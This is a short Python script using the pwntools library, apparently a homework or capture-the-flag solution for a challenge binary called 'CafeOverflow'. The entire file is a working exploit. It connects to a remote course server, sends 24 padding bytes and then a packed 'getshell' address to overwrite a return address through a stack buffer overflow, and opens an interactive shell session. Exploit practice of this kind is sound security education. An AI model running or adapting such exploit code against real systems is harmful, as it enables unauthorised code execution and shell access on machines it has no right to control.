from pwn import *

#r = process('./CafeOverflow')
r = remote('hw00.zoolab.org', 65534)
getshell_address = p64(0x4011a1)
r.sendline(b'A'*24 + getshell_address)
r.interactive()
